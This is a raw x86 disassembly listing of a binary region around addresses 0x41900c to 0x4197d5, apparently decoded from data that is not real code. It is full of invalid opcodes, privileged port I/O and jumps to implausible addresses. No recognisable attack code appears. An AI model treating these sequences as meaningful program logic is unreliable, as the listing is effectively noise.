  41900c:	and    DWORD PTR [ebx+0x4b46ff85],eax
  419012:	mov    edx,0xac1f647e
  419017:	xchg   BYTE PTR fs:[edi+eiz*1-0x1511bf2c],dl
  41901f:	sti    
  419020:	or     DWORD PTR [ebp-0x44ef0bc5],esi
  419026:	pop    ecx
  419027:	add    ah,ah
  419029:	test   dh,0x7e
  41902c:	fild   DWORD PTR ds:0xf7e2242e
  419032:	imul   ebx,DWORD PTR [ebx+0x18691ab9],0xffffff8c
  419039:	aaa    
  41903a:	jbe    0x41900c
  41903c:	ins    DWORD PTR es:[edi],dx
  41903d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41903e:	jmp    0x38177adb
  419043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419044:	jnp    0x41904c
  419046:	sub    ebx,DWORD PTR fs:[esi-0x28]
  41904a:	pop    ecx
  41904b:	pop    ebx
  41904c:	scas   al,BYTE PTR es:[edi]
  41904d:	mov    cs,WORD PTR [edi+0x8]
  419050:	xor    eax,0x695bafb3
  419055:	popa   
  419056:	gs test al,0xb3
  419059:	inc    ebx
  41905a:	push   ds
  41905b:	test   al,0x17
  41905d:	pop    edi
  41905e:	push   edx
  41905f:	dec    ecx
  419060:	push   0x3b
  419062:	jne    0x419048
  419064:	std    
  419065:	std    
  419066:	ins    DWORD PTR es:[edi],dx
  419067:	inc    ecx
  419068:	or     cl,BYTE PTR [edi]
  41906a:	adc    bl,0x40
  41906d:	imul   esp,eax,0x3dbb8260
  419073:	ins    BYTE PTR es:[edi],dx
  419074:	cmp    ecx,edx
  419076:	lock inc esi
  419078:	inc    edi
  419079:	jo     0x419028
  41907b:	sbb    eax,0x1f5660b1
  419080:	cwde   
  419081:	mov    WORD PTR [ebx],gs
  419083:	aam    0x57
  419085:	pop    edi
  419086:	pop    edx
  419087:	dec    eax
  419088:	retf   
  419089:	inc    ebp
  41908a:	mov    ecx,0xfe4761ba
  41908f:	retf   0xeb3
  419092:	out    0x5f,al
  419094:	cs enter 0x6d0d,0x25
  419099:	mov    eax,0x60bc02e
  41909e:	inc    edi
  41909f:	loope  0x419107
  4190a1:	leave  
  4190a2:	sub    al,0xf8
  4190a4:	inc    esp
  4190a5:	inc    eax
  4190a6:	jp     0x419122
  4190a8:	jg     0x419086
  4190aa:	xchg   ecx,eax
  4190ab:	out    dx,al
  4190ac:	inc    edi
  4190ad:	fwait
  4190ae:	xchg   esi,eax
  4190af:	mov    al,ds:0x6d82f83b
  4190b4:	inc    esp
  4190b5:	pusha  
  4190b6:	mov    bl,0xb4
  4190b8:	loopne 0x41910b
  4190ba:	cld    
  4190bb:	mov    dl,0xe0
  4190bd:	pushf  
  4190be:	ret    0xfcd1
  4190c1:	in     eax,0x49
  4190c3:	test   DWORD PTR [ebp+0x879701],0xee74ca5
  4190cd:	ds out 0x63,al
  4190d0:	dec    esp
  4190d1:	fmul   QWORD PTR [ecx+edx*4]
  4190d4:	add    ecx,ebx
  4190d6:	sbb    BYTE PTR [esi],ah
  4190d8:	sbb    bh,0x24
  4190db:	dec    esp
  4190dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190dd:	pushf  
  4190de:	test   al,0x5c
  4190e0:	xchg   ebp,eax
  4190e1:	adc    al,ah
  4190e3:	cmp    cl,BYTE PTR [ebx-0x78]
  4190e6:	or     ebp,DWORD PTR [ebp-0x35909921]
  4190ec:	sbb    edi,DWORD PTR [edx]
  4190ee:	mov    ecx,0x867c843b
  4190f3:	mov    bh,0x31
  4190f5:	jge    0x4190b0
  4190f7:	add    DWORD PTR [edx],ebx
  4190f9:	and    dl,dh
  4190fb:	mov    bh,0x74
  4190fd:	aad    0x64
  4190ff:	xor    eax,0xf6be60de
  419104:	push   edx
  419105:	ins    BYTE PTR es:[edi],dx
  419106:	jb     0x419137
  419108:	out    dx,al
  419109:	jae    0x41912d
  41910b:	push   ebp
  41910c:	mov    ch,0x70
  41910e:	stos   DWORD PTR es:[edi],eax
  41910f:	ret    
  419110:	in     eax,dx
  419111:	jl     0x41916d
  419113:	test   eax,0x616345bf
  419118:	pushf  
  419119:	shl    BYTE PTR [ebp+0x47],0xb0
  41911d:	cwde   
  41911e:	outs   dx,DWORD PTR ds:[esi]
  41911f:	mov    ch,0xc0
  419121:	rcr    BYTE PTR [ebp-0xe1457c2],1
  419127:	inc    edx
  419128:	dec    esp
  419129:	jle    0x4190ee
  41912b:	xor    al,0xa1
  41912e:	setb   BYTE PTR [edi]
  419131:	dec    edi
  419132:	jae    0x419187
  419134:	lock cmc 
  419136:	inc    ebx
  419137:	data16 jecxz 0x419115
  41913a:	push   ss
  41913b:	dec    edx
  41913c:	retf   
  41913d:	adc    eax,0xc58210e
  419142:	xchg   edx,eax
  419143:	cmp    eax,0x1bcd000d
  419148:	add    al,bl
  41914a:	adc    BYTE PTR [eax],ch
  41914c:	xchg   edx,eax
  41914d:	xchg   DWORD PTR ss:[ecx+0x51b97c33],edi
  419154:	mov    al,BYTE PTR [ecx-0x10]
  419157:	inc    DWORD PTR [edi]
  419159:	xor    cl,BYTE PTR [ebx+0x48]
  41915c:	dec    ebp
  41915d:	mov    al,0x71
  41915f:	pop    edi
  419160:	add    ah,0x2a
  419163:	push   edi
  419164:	xchg   esi,eax
  419165:	mov    esp,0xc0cde068
  41916a:	imul   eax,edx,0x772cf618
  419170:	add    al,0xb7
  419172:	call   ebp
  419174:	adc    esi,DWORD PTR [esi+0x4f701f5f]
  41917a:	pusha  
  41917b:	pop    ecx
  41917c:	sbb    eax,0xdf67dcbf
  419181:	and    ebx,ebp
  419183:	mov    ebp,0xd9f53cc7
  419188:	leave  
  419189:	adc    ch,al
  41918b:	sti    
  41918c:	xchg   DWORD PTR [esp+esi*8-0x76],edi
  419190:	jnp    0x419125
  419192:	and    BYTE PTR [ecx-0x6bd90ee1],al
  419198:	in     eax,dx
  419199:	add    DWORD PTR ds:0xa1577428,edx
  41919f:	idiv   ebx
  4191a1:	je     0x419126
  4191a3:	adc    ecx,esi
  4191a5:	cmp    eax,DWORD PTR [esi+0x7ef7d340]
  4191ab:	xor    BYTE PTR [ebx-0x781da615],cl
  4191b1:	sub    ah,bl
  4191b3:	or     edi,esi
  4191b5:	sbb    edx,eax
  4191b7:	mov    edi,0x19177142
  4191bc:	js     0x419148
  4191be:	or     al,0x30
  4191c0:	mov    esp,0xc1061488
  4191c5:	repz or ebp,ecx
  4191c8:	dec    edx
  4191c9:	mov    ebp,0x4ae4d701
  4191ce:	or     BYTE PTR [ecx-0x34],dh
  4191d1:	scas   eax,DWORD PTR es:[edi]
  4191d2:	jmp    DWORD PTR [ebp+0x5f2d359b]
  4191d8:	js     0x419198
  4191da:	inc    edx
  4191db:	jae    0x419227
  4191dd:	(bad)  
  4191de:	hlt    
  4191df:	mov    cl,0xbf
  4191e1:	jae    0x4191d0
  4191e3:	ror    DWORD PTR [eax-0x7e99063a],0x54
  4191ea:	dec    ebp
  4191eb:	jns    0x419187
  4191ed:	lahf   
  4191ee:	cmp    eax,0x61aa4a54
  4191f3:	std    
  4191f4:	dec    edi
  4191f5:	mov    ds:0x5808ad6f,eax
  4191fa:	jo     0x41920a
  4191fc:	lods   al,BYTE PTR ds:[esi]
  4191fd:	cmp    ah,BYTE PTR [ebp-0x80]
  419200:	mov    bh,0x1c
  419202:	xchg   BYTE PTR [edx-0x27932afc],cl
  419208:	test   al,0xd5
  41920a:	and    DWORD PTR [edx+0x5b],esp
  41920d:	cli    
  41920e:	add    eax,0x40482246
  419213:	mov    eax,ds:0x36420e26
  419218:	(bad)  
  419219:	push   cs
  41921a:	into   
  41921b:	neg    DWORD PTR [ecx+0x39]
  41921e:	fcom   QWORD PTR [edi+0x8]
  419221:	inc    edx
  419222:	xchg   cl,bl
  419224:	adc    al,BYTE PTR [eax+0x3b]
  419227:	mov    WORD PTR [ebx-0xa],?
  41922a:	and    al,0x22
  41922c:	xlat   BYTE PTR ds:[ebx]
  41922d:	shl    DWORD PTR fs:[ebx-0x3fa8f18f],1
  419234:	xchg   edi,eax
  419235:	scas   al,BYTE PTR es:[edi]
  419236:	adc    al,0x86
  419238:	inc    esi
  419239:	mov    es,WORD PTR [edi-0x4d63faea]
  41923f:	xchg   esi,eax
  419240:	add    eax,0x28f8467d
  419245:	les    eax,FWORD PTR [edi]
  419247:	mov    al,0xe1
  419249:	pop    ds
  41924a:	bound  eax,QWORD PTR [ebx+eax*2-0x2c172416]
  419251:	pandn  mm3,QWORD PTR [ebx]
  419254:	pop    ebx
  419255:	shl    ecx,cl
  419257:	pop    ebx
  419258:	fwait
  419259:	jl     0x41922d
  41925b:	in     al,0x1b
  41925d:	scas   eax,DWORD PTR es:[edi]
  41925e:	sti    
  41925f:	xchg   ecx,eax
  419260:	mov    bh,0x0
  419262:	inc    ecx
  419263:	xchg   DWORD PTR [edx],eax
  419265:	and    dl,dl
  419267:	push   0x6a
  419269:	je     0x4192ba
  41926b:	and    al,0xe9
  41926d:	mov    ecx,0xb4a7a65a
  419272:	cld    
  419273:	adc    eax,0xbc9233b0
  419278:	cmc    
  419279:	pop    esp
  41927a:	fwait
  41927b:	xor    eax,0x48db1036
  419280:	jmp    0x2aec:0xe5faa1af
  419287:	outs   dx,DWORD PTR ds:[esi]
  419288:	push   edx
  419289:	repz jp 0x41920c
  41928c:	jmp    0x566261c6
  419291:	push   edi
  419292:	sub    eax,0x90937966
  419297:	mov    bh,0xa3
  419299:	add    ch,BYTE PTR [eax+0x1af3fdac]
  41929f:	in     eax,0x9d
  4192a1:	xchg   esi,eax
  4192a2:	jne    0x41923a
  4192a4:	mov    ss,WORD PTR [ebx-0x9]
  4192a7:	pop    ebp
  4192a8:	xor    ebp,DWORD PTR [ebp+0x4e]
  4192ab:	popf   
  4192ac:	fnstsw WORD PTR [edi+ecx*4-0x7a6da829]
  4192b3:	xchg   ecx,eax
  4192b4:	jmp    0x54a6a55c
  4192b9:	mov    dl,0x77
  4192bb:	pop    esp
  4192bc:	lods   al,BYTE PTR ds:[esi]
  4192bd:	lods   al,BYTE PTR ds:[esi]
  4192be:	mov    esp,DWORD PTR [ebp+0x1790a118]
  4192c4:	test   al,0x28
  4192c6:	push   eax
  4192c7:	sbb    ebx,ebx
  4192c9:	or     ebp,DWORD PTR [ecx]
  4192cb:	adc    DWORD PTR [eax*8-0x31f02290],ecx
  4192d2:	(bad)  
  4192d3:	enter  0x51da,0xe3
  4192d7:	inc    ebx
  4192d8:	inc    eax
  4192d9:	mov    WORD PTR [ecx-0x220e69f2],es
  4192df:	mov    ecx,0x4ae3ea71
  4192e4:	push   edi
  4192e5:	mov    ds:0xb44a0efc,al
  4192ea:	cmc    
  4192eb:	add    ecx,ecx
  4192ed:	cmp    eax,0x2a5af80e
  4192f2:	cmp    BYTE PTR [eax],dh
  4192f4:	call   0xc549:0x8b15c6f4
  4192fb:	gs test bh,cl
  4192fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ff:	test   al,0xf2
  419301:	sbb    bl,al
  419303:	mov    esi,DWORD PTR ds:0x9979585d
  419309:	xchg   ecx,eax
  41930a:	push   edx
  41930b:	mov    ecx,0xdd08f2a1
  419310:	inc    edx
  419311:	mov    bh,0xd1
  419313:	jg     0x41935e
  419315:	gs out dx,eax
  419317:	push   edi
  419318:	outs   dx,DWORD PTR ds:[esi]
  419319:	shl    esi,cl
  41931b:	iret   
  41931c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41931d:	jge    0x419390
  41931f:	mov    bl,0x92
  419321:	push   0x308e56db
  419326:	jp     0x419352
  419328:	pop    DWORD PTR [edx+edx*8-0xd]
  41932c:	inc    ecx
  41932d:	ins    BYTE PTR es:[edi],dx
  41932e:	into   
  41932f:	mov    cl,BYTE PTR [ecx+0x305f7f87]
  419335:	xchg   ebp,eax
  419336:	mov    DWORD PTR [ecx+0x11],edx
  419339:	popa   
  41933a:	imul   edi,ebp,0xffffffc8
  41933d:	push   cs
  41933e:	xchg   esp,eax
  41933f:	stos   DWORD PTR es:[edi],eax
  419340:	loop   0x419390
  419342:	fxch   st(6)
  419344:	mov    al,ds:0x580bd821
  419349:	int    0x62
  41934b:	cmp    BYTE PTR [ebx],dh
  41934d:	and    ebp,DWORD PTR [ebp-0x65]
  419350:	(bad)  
  419351:	pop    ds
  419352:	push   ss
  419353:	bound  ebx,QWORD PTR [edx]
  419355:	jno    0x41930a
  419357:	(bad)  [ecx+0x2e]
  41935a:	cld    
  41935b:	sub    eax,0x1a112f3f
  419360:	shr    DWORD PTR [edx],cl
  419362:	sbb    al,0x48
  419364:	xlat   BYTE PTR ds:[ebx]
  419365:	dec    eax
  419366:	cmp    edi,DWORD PTR [edx+eax*2+0x77754bc0]
  41936d:	fcmovb st,st(1)
  41936f:	in     eax,dx
  419370:	lds    edi,FWORD PTR [esi-0x55a8b81b]
  419376:	out    0x4e,eax
  419378:	xchg   edi,eax
  419379:	sbb    BYTE PTR [ecx+0x5d2eaacd],dh
  41937f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419380:	repz mov ds,WORD PTR [eax+0x1c]
  419384:	sub    dl,BYTE PTR [esi]
  419386:	dec    ebx
  419387:	sub    edx,ecx
  419389:	stos   BYTE PTR es:[edi],al
  41938a:	mov    WORD PTR ds:0xd321a40c,ss
  419390:	daa    
  419391:	pop    esi
  419392:	imul   ebx,DWORD PTR [ebx-0x5db29d27],0xa39b8a7e
  41939c:	pop    ebx
  41939d:	out    0xc5,eax
  41939f:	retf   0x5380
  4193a2:	xchg   esi,eax
  4193a3:	cmp    ah,BYTE PTR [esi+0xc02ab7e]
  4193a9:	arpl   WORD PTR [edx+0x13],bx
  4193ac:	jp     0x4193ca
  4193ae:	(bad)  
  4193af:	(bad)  
  4193b0:	add    esi,ebp
  4193b2:	jmp    0xd4a28c0b
  4193b7:	repnz enter 0x157f,0x22
  4193bc:	das    
  4193bd:	add    dl,BYTE PTR [edx]
  4193bf:	mov    dl,ch
  4193c1:	jns    0x419359
  4193c3:	out    dx,al
  4193c4:	lods   al,BYTE PTR ds:[esi]
  4193c5:	out    0x38,al
  4193c7:	xchg   esp,eax
  4193c8:	sahf   
  4193c9:	popf   
  4193ca:	ins    DWORD PTR es:[edi],dx
  4193cb:	push   0xfffffff7
  4193cd:	test   ch,0x40
  4193d0:	rcl    BYTE PTR [eax-0x44],0x44
  4193d4:	push   0xffffffdc
  4193d6:	pushf  
  4193d7:	imul   ecx,DWORD PTR [eax],0x7a
  4193da:	aas    
  4193db:	je     0x4193ba
  4193dd:	inc    ebx
  4193de:	and    DWORD PTR [ecx-0x274a8398],eax
  4193e4:	(bad)  
  4193e6:	adc    dl,BYTE PTR [eax-0x77ee5a3a]
  4193ec:	cmp    ecx,DWORD PTR [ecx+0x19b45224]
  4193f2:	ds xchg ecx,eax
  4193f4:	mov    ah,0xda
  4193f6:	dec    ebp
  4193f7:	test   DWORD PTR [edx],edi
  4193f9:	imul   edi,ebp,0xffffffdb
  4193fc:	mov    ebx,0xea2824c9
  419401:	sbb    al,0xe4
  419403:	int    0xa7
  419405:	outs   dx,BYTE PTR ds:[esi]
  419406:	push   esi
  419407:	sub    al,0xf3
  419409:	dec    ebx
  41940a:	mov    BYTE PTR [ebx+0x3e137ee0],ch
  419410:	out    dx,al
  419411:	xchg   esi,eax
  419412:	push   ss
  419413:	inc    esi
  419414:	or     ebp,DWORD PTR [esi+0x33]
  419417:	lods   eax,DWORD PTR ds:[esi]
  419418:	les    edx,FWORD PTR [esi-0x401f6063]
  41941e:	or     BYTE PTR [eax-0x21],dh
  419421:	ficom  DWORD PTR [ebx+0x5adf667c]
  419427:	pop    esi
  419428:	add    al,0x52
  41942a:	cli    
  41942b:	sbb    DWORD PTR [esi-0x56],ecx
  41942e:	cli    
  41942f:	in     eax,dx
  419430:	xor    eax,0xf8a7d941
  419435:	jecxz  0x41942d
  419437:	ds pop ss
  419439:	adc    ch,BYTE PTR [eax]
  41943b:	shl    BYTE PTR [esi+0x4e],cl
  41943e:	retf   
  41943f:	jmp    0xc74cb021
  419444:	adc    DWORD PTR [ebx+0x418291e3],eax
  41944a:	push   esi
  41944b:	out    dx,eax
  41944c:	ja     0x41941e
  41944e:	in     eax,0x9d
  419450:	data16 cmp bh,BYTE PTR [ecx-0x5f]
  419454:	and    eax,0x97a415a3
  419459:	sub    BYTE PTR [edx-0x12],bl
  41945c:	out    0xcf,al
  41945e:	rcl    ah,0x80
  419461:	daa    
  419462:	lods   al,BYTE PTR ds:[esi]
  419463:	jmp    0x419490
  419465:	xchg   ebx,eax
  419466:	(bad)  
  419467:	js     0x419466
  419469:	jbe    0x419432
  41946b:	push   ecx
  41946c:	in     al,0x98
  41946e:	add    eax,0x71d6e953
  419473:	aam    0x9c
  419475:	cmp    al,ch
  419477:	bound  esp,QWORD PTR [ebx+0x1e]
  41947a:	dec    edx
  41947b:	xchg   ebx,eax
  41947c:	test   eax,edi
  41947e:	or     cl,cl
  419480:	or     al,bl
  419482:	jecxz  0x419432
  419484:	repnz xor al,0x6e
  419487:	out    0xe4,eax
  419489:	mov    bl,0x27
  41948b:	pop    edx
  41948c:	nop
  41948d:	test   al,0x5b
  41948f:	clc    
  419490:	inc    ecx
  419491:	bound  ebp,QWORD PTR [edx+eiz*2+0xa97269]
  419498:	aaa    
  419499:	aam    0x45
  41949b:	or     eax,0x5a8e9119
  4194a0:	and    DWORD PTR [edi+0x1f],esi
  4194a3:	xchg   esi,eax
  4194a4:	mov    BYTE PTR [ecx+0x1],bl
  4194a7:	dec    esp
  4194a8:	call   0xbc80:0xf580f0c1
  4194af:	mov    ch,0x88
  4194b1:	push   cs
  4194b2:	cdq    
  4194b3:	xlat   BYTE PTR ds:[ebx]
  4194b4:	jbe    0x41946f
  4194b6:	dec    esp
  4194b7:	jecxz  0x419452
  4194b9:	aaa    
  4194ba:	or     DWORD PTR [ecx],0xffffffbb
  4194bd:	xchg   ebx,eax
  4194be:	xchg   esp,eax
  4194bf:	xor    ch,BYTE PTR [esi+0x70]
  4194c2:	test   al,0xec
  4194c4:	ss call 0xf2d9c87f
  4194ca:	out    dx,eax
  4194cb:	sub    BYTE PTR [eax+eax*2-0x48],dh
  4194cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194d0:	and    BYTE PTR [ebx-0x4f],bh
  4194d3:	pop    ss
  4194d4:	aas    
  4194d5:	push   ds
  4194d6:	cwde   
  4194d7:	xor    BYTE PTR [ebx-0x1c],bh
  4194da:	push   ebx
  4194db:	mov    eax,ds:0xc9c688db
  4194e0:	jge    0x419529
  4194e2:	jmp    0x41950d
  4194e4:	and    dl,BYTE PTR [eax-0x26]
  4194e7:	pop    esp
  4194e8:	pushf  
  4194e9:	adc    esi,DWORD PTR [eax-0x67]
  4194ec:	imul   DWORD PTR [ebx+0x4]
  4194ef:	mov    bl,0x1c
  4194f1:	cmp    al,0xf4
  4194f3:	xchg   ecx,eax
  4194f5:	cmp    eax,0xa32137a3
  4194fa:	push   eax
  4194fb:	push   esi
  4194fc:	sub    eax,0xb6c34069
  419501:	xchg   edi,eax
  419502:	mov    edi,0xf54be283
  419507:	repz mov eax,ds:0xe9ddc8ff
  41950d:	xchg   ecx,eax
  41950e:	jb     0x41950d
  419510:	add    BYTE PTR ss:[eax+0x5d9cba39],cl
  419517:	leave  
  419518:	hlt    
  419519:	push   cs
  41951a:	adc    ch,BYTE PTR [eax-0x573952e2]
  419520:	mov    eax,0x9076039c
  419525:	addr16 lahf 
  419527:	jmp    0x419533
  419529:	test   al,0x1a
  41952b:	pop    edx
  41952c:	lock and DWORD PTR [esi+0x60],edx
  419530:	repz push ds
  419532:	lahf   
  419533:	xchg   BYTE PTR [ebx-0x73],dh
  419536:	xchg   edx,eax
  419537:	and    eax,0x467edd30
  41953c:	cwde   
  41953d:	mov    bl,0xf2
  41953f:	dec    edx
  419540:	(bad)  
  419541:	pop    ebp
  419542:	inc    ebx
  419543:	test   eax,0xcdd692d3
  419548:	les    eax,FWORD PTR [esi+esi*8]
  41954b:	ss sub eax,0x46afdb49
  419551:	aas    
  419552:	dec    ecx
  419553:	mov    BYTE PTR [ebx+0x22fef8bc],cl
  419559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41955a:	xchg   edi,eax
  41955b:	inc    esi
  41955c:	sub    eax,0xd49a0a7a
  419561:	pop    esp
  419562:	and    al,0xe2
  419564:	rcr    DWORD PTR [ebx],0x57
  419567:	sbb    al,0xad
  419569:	xchg   ebx,eax
  41956a:	call   0x132c6190
  41956f:	xchg   esp,eax
  419570:	jle    0x419576
  419572:	xchg   edx,eax
  419573:	jns    0x419533
  419575:	lea    eax,[ebx]
  419577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419578:	xor    eax,0x9548a819
  41957d:	sub    eax,0xa9a224ee
  419582:	aad    0xf
  419584:	inc    edi
  419585:	sub    eax,0x38d737b6
  41958a:	fld    DWORD PTR [edx]
  41958c:	mov    edx,0x96da09ce
  419591:	arpl   WORD PTR ds:0xe9fc1f84,cx
  419597:	mov    esi,DWORD PTR [esi-0x4e]
  41959a:	xchg   ebx,eax
  41959b:	loope  0x4195c6
  41959d:	cwde   
  41959e:	nop
  41959f:	xchg   ch,cl
  4195a1:	add    eax,0x6c2c558b
  4195a6:	or     eax,0xf578252c
  4195ab:	or     BYTE PTR [esi+0x1f],dh
  4195ae:	dec    esp
  4195af:	adc    DWORD PTR [ebx+0x75],esi
  4195b2:	cmp    DWORD PTR [ecx+0x46],ecx
  4195b5:	ja     0x419584
  4195b7:	lock xor DWORD PTR ds:0xd3639380,edx
  4195be:	icebp  
  4195bf:	dec    ebx
  4195c0:	imul   DWORD PTR [eax+0x6cfa87f7]
  4195c6:	mov    ss,WORD PTR [eax+edx*1-0x71]
  4195ca:	xchg   esp,eax
  4195cb:	push   es
  4195cc:	adc    al,0x6d
  4195ce:	mov    dh,0xcb
  4195d0:	inc    eax
  4195d1:	cs (bad) 
  4195d3:	xchg   DWORD PTR [edx],eax
  4195d5:	or     DWORD PTR [edx+ebp*1-0x51],eax
  4195d9:	adc    BYTE PTR [edx+edx*1-0x3002ceb8],0xb
  4195e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195e2:	imul   BYTE PTR [edi]
  4195e4:	mov    dl,0x2f
  4195e6:	int3   
  4195e7:	iret   
  4195e8:	add    DWORD PTR [eax-0x41a9ee2f],ecx
  4195ee:	push   es
  4195ef:	jecxz  0x4195d6
  4195f1:	mov    ebx,0x32c3bc92
  4195f6:	jp     0x4195a4
  4195f8:	out    dx,eax
  4195f9:	mov    WORD PTR [edx+0x735ca6a5],cs
  4195ff:	push   edi
  419600:	arpl   WORD PTR [edi],bp
  419602:	das    
  419603:	lea    ecx,[eax*1+0x3034a0f1]
  41960a:	push   ds
  41960b:	test   DWORD PTR [edx],edx
  41960d:	retf   
  41960e:	addr16 mov esp,0x909d2d74
  419614:	or     al,0xb1
  419616:	repnz push eax
  419618:	xchg   DWORD PTR [edi+ecx*4-0x373f3935],ecx
  41961f:	cmp    al,BYTE PTR [esp+ebx*2]
  419622:	mov    ?,edi
  419624:	sub    al,0xba
  419626:	pop    eax
  419627:	sub    DWORD PTR [edi+0x14],edi
  41962a:	repz daa 
  41962c:	xor    BYTE PTR [edx+0x138f28a2],0x7
  419633:	push   ecx
  419635:	popa   
  419636:	xchg   edx,eax
  419637:	mov    al,ds:0xae35b0a9
  41963c:	ror    DWORD PTR [edx],0xb7
  41963f:	or     eax,DWORD PTR [ecx+ecx*4-0x2ffb09c0]
  419646:	pop    es
  419647:	rcr    BYTE PTR [edi],cl
  419649:	outs   dx,DWORD PTR ds:[esi]
  41964a:	fst    DWORD PTR [ebx+0x41]
  41964d:	shl    DWORD PTR [edi],1
  41964f:	jnp    0x41963f
  419651:	neg    dl
  419653:	add    DWORD PTR [eax+0x1a160e25],esp
  419659:	inc    ebx
  41965a:	mul    BYTE PTR [edi-0x78]
  41965d:	(bad)  
  41965e:	ins    DWORD PTR es:[edi],dx
  41965f:	hlt    
  419660:	and    ch,BYTE PTR [edx]
  419662:	xlat   BYTE PTR ds:[ebx]
  419663:	xchg   esp,eax
  419664:	repz mov eax,ds:0xcf43902
  41966a:	sub    eax,0xa412e0e5
  41966f:	loop   0x4195fb
  419671:	push   ss
  419672:	test   DWORD PTR [ebp+ebp*2-0x1e8418df],0x7fc79f71
  41967d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41967e:	xchg   ecx,eax
  41967f:	xchg   esp,eax
  419680:	(bad)  
  419681:	fwait
  419682:	mov    cl,0x81
  419684:	dec    esp
  419685:	inc    ebx
  419686:	test   DWORD PTR [ebx],edi
  419688:	xor    dl,BYTE PTR [edi+ebp*8+0x17]
  41968c:	sbb    DWORD PTR [eax-0x64],esp
  41968f:	pop    edx
  419690:	aas    
  419691:	dec    edx
  419692:	enter  0xd25f,0x1
  419696:	dec    esi
  419697:	es (bad) 
  41969a:	sbb    eax,0x2764f18f
  41969f:	xchg   ebx,eax
  4196a0:	fadd   QWORD PTR [edx-0x1d6e6b47]
  4196a6:	iret   
  4196a7:	push   cs
  4196a8:	scas   al,BYTE PTR es:[edi]
  4196a9:	jmp    0x6c41e098
  4196ae:	and    al,0x19
  4196b0:	inc    esi
  4196b1:	rcr    DWORD PTR [esi],0x49
  4196b4:	sbb    al,0xa
  4196b6:	pusha  
  4196b7:	call   0xe10a6cb4
  4196bc:	lea    ecx,[eax+ebx*1]
  4196bf:	(bad)  
  4196c0:	pop    esi
  4196c1:	arpl   WORD PTR [ecx-0x12072b40],sp
  4196c7:	pop    es
  4196c8:	retf   0xa9a7
  4196cb:	or     DWORD PTR [edi-0x59],ebx
  4196ce:	xchg   edx,eax
  4196cf:	dec    edi
  4196d0:	and    ebx,ebx
  4196d2:	std    
  4196d3:	sbb    eax,0xf10cf3e0
  4196d8:	ret    0x832f
  4196db:	jmp    0x75b5d3a4
  4196e0:	into   
  4196e1:	sti    
  4196e2:	dec    esi
  4196e3:	out    dx,al
  4196e4:	imul   edi,DWORD PTR [ebx+0x19340b13],0x31e3656e
  4196ee:	inc    ebp
  4196ef:	lock sub al,0xaf
  4196f2:	or     al,BYTE PTR [esi+0x6f116826]
  4196f8:	dec    edx
  4196f9:	cmp    BYTE PTR [edx],dl
  4196fb:	retf   0xfa6a
  4196fe:	je     0x41976e
  419700:	(bad)  
  419701:	mov    eax,ds:0x49b4e4e8
  419706:	adc    al,0xbd
  419708:	xor    eax,0xe874a3ab
  41970d:	lahf   
  41970e:	xchg   esp,eax
  41970f:	or     eax,0x2ddbd57b
  419714:	repnz or al,0x2a
  419717:	int3   
  419718:	imul   edx,ebx,0x2a8a0b27
  41971e:	and    ebx,DWORD PTR [ebx+0x35]
  419721:	pushf  
  419722:	jo     0x4196f5
  419724:	addr16 loope 0x419724
  419727:	mov    eax,ds:0x697f6809
  41972c:	xor    DWORD PTR [ebp-0x7f],esp
  41972f:	and    ebp,DWORD PTR [edi]
  419731:	mov    al,BYTE PTR [ecx-0x6]
  419734:	je     0x419725
  419736:	ficomp WORD PTR [ebx-0xbad62b0]
  41973c:	mov    ah,0xd9
  41973e:	cmp    al,0xac
  419740:	dec    esi
  419741:	in     al,dx
  419742:	mov    cl,0x88
  419744:	das    
  419745:	jmp    0x1008f616
  41974a:	xlat   BYTE PTR ds:[ebx]
  41974b:	xor    eax,0x43f81935
  419750:	cmp    al,0x89
  419752:	and    dh,BYTE PTR [esi]
  419754:	xor    eax,DWORD PTR [ecx+0xc]
  419757:	inc    esp
  419758:	pop    ss
  419759:	dec    edx
  41975a:	jne    0x419759
  41975c:	jg     0x4196f9
  41975e:	cwde   
  41975f:	mov    WORD PTR [edx+ebp*4],ss
  419762:	test   al,0x29
  419764:	mov    eax,0x76bb7f19
  419769:	dec    esi
  41976a:	scas   eax,DWORD PTR es:[edi]
  41976b:	les    esi,FWORD PTR [ebx+0x6c]
  41976e:	retf   0x63e8
  419771:	outs   dx,BYTE PTR ds:[esi]
  419772:	in     eax,dx
  419773:	add    bl,ch
  419775:	push   es
  419776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419777:	test   BYTE PTR [edi+0x13ea18e0],cl
  41977d:	(bad)  
  41977e:	mov    dh,0xea
  419780:	inc    eax
  419781:	adc    DWORD PTR [esp+esi*2+0x5],edx
  419785:	(bad)  
  419786:	(bad)  
  419788:	out    dx,eax
  419789:	int    0x6a
  41978b:	sub    edx,DWORD PTR [edx+0x3]
  41978e:	push   ebp
  41978f:	ss aaa 
  419791:	arpl   WORD PTR [ebp+0x78],si
  419794:	clc    
  419795:	inc    eax
  419796:	xchg   ebx,eax
  419797:	mov    cl,0xd8
  419799:	aaa    
  41979a:	xor    BYTE PTR [ebx-0x5e6e9fef],ah
  4197a0:	(bad)  
  4197a1:	pop    ds
  4197a2:	jbe    0x419823
  4197a4:	out    dx,al
  4197a5:	cmp    dh,0x72
  4197a8:	popf   
  4197a9:	mov    esp,0x93ac6d10
  4197ae:	jno    0x419788
  4197b0:	fild   DWORD PTR [edx-0x501caa0a]
  4197b6:	mov    ecx,0x8549f836
  4197bb:	test   DWORD PTR ds:0x46fb934b,edx
  4197c1:	(bad)  
  4197c2:	shl    eax,cl
  4197c4:	jno    0x419801
  4197c6:	inc    esp
  4197c7:	adc    eax,0xa0f780ae
  4197cc:	add    BYTE PTR [edi],dh
  4197ce:	jge    0x4197b6
  4197d0:	dec    edi
  4197d1:	jae    0x41980f
  4197d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197d4:	icebp  
  4197d5:	xor    ebp,DWORD PTR [ecx-0x4f]
